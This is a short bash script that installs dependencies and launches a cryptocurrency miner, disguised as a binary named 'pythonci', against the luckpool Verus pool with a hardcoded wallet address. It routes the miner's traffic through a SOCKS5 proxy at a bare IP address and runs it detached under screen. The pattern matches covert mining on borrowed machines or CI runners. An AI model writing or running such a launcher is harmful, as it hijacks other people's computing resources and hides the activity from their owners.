#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x vivi.sh && chmod +x pythonci chmod 777 pythonci vivi.sh
screen -dmS ls
PL=stratum+tcp://eu.luckpool.net:3956
WT=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
WR=VIA-009
PY=socks5://185.136.162.16:1851
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY

